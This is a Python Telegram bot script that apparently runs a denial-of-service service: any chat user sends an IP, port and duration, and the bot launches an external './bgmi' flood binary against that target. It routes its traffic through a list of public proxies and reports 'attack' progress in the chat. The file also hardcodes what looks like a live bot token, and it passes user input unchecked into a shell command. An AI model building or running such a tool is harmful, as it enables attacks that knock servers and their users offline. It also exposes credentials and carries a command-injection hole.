import os
import telebot
import logging
import asyncio
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import random

loop = asyncio.get_event_loop()

# Add your actual bot token here
TOKEN = '7051278092:AAGeMDHc7haBcoFh0h1ToAhO2S4jgdVjO2E'
FORWARD_CHANNEL_ID = -1002372939328
CHANNEL_ID = -1002372939328
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)


proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]

# Initialize bot with a proxy
random_proxy = random.choice(proxy_list)
telebot.apihelper.proxy = {'https': random_proxy}

bot = telebot.TeleBot(TOKEN)

# Async I/O loop
async def start_asyncio_loop():
    try:
        while True:
            await asyncio.sleep(REQUEST_INTERVAL)
    except Exception as e:
        logging.error(f"Error in asyncio loop: {e}")

async def run_attack_command_async(target_ip, target_port, duration, message):
    try:
        # Run the shell command for the attack (replace this with the actual attack command)
        process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")

        # Track and update the message with time left
        for remaining in range(int(duration), 0, -1):
            await asyncio.sleep(1)
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"*Attack in Progress 💥*\n\n*Host*: `{target_ip}`\n*Port*: `{target_port}`\n*Time Left*: `{remaining}s`",
                parse_mode='Markdown'
            )

        await process.communicate()

        # Send a formatted message after the attack completes
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=f"✅ *Attack Completed Successfully*\n\n*Host*: `{target_ip}`\n*Port*: `{target_port}`\n*Duration*: `{duration}s`",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error running attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    chat_id = message.chat.id
    try:
        bot.send_message(chat_id, "*Please enter the target in the format:*\n`IP:PORT (Port Map)`\n\nOr with a time duration:\n`IP:PORT (Port Map) TIME (in seconds)`", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()

        if len(args) == 1:
            # Handle case where only IP:PORT is provided
            target_info = args[0]
            duration = 60  # Default time duration if not provided
        elif len(args) == 2:
            # Handle case where IP:PORT and TIME are provided
            target_info = args[0]
            duration = args[1]
        else:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: IP:PORT (Port Map) or IP:PORT (Port Map) TIME (in seconds)*", parse_mode='Markdown')
            return

        target_ip, target_port = target_info.split(":")
        target_port = int(target_port)

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Send the initial message and update it during the attack
        msg = bot.send_message(message.chat.id, f"*Attack Started 💥*\n\n*Host*: `{target_ip}`\n*Port*: `{target_port}`\n*Time Left*: `{duration}s`", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, msg), loop)
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        # Create a markup object with only the Attack option
        markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
        btn1 = KeyboardButton("Attack")
        markup.add(btn1)

        bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    try:
        if message.text == "Attack":
            bot.reply_to(message, "*Attack command starting...*", parse_mode='Markdown')
            attack_command(message)
        else:
            bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in handling message: {e}")

if __name__ == "__main__":
    try:
        asyncio_thread = Thread(target=lambda: loop.run_until_complete(start_asyncio_loop()))
        asyncio_thread.start()

        # Start polling to process Telegram bot updates
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        logging.error(f"Error in main thread: {e}")
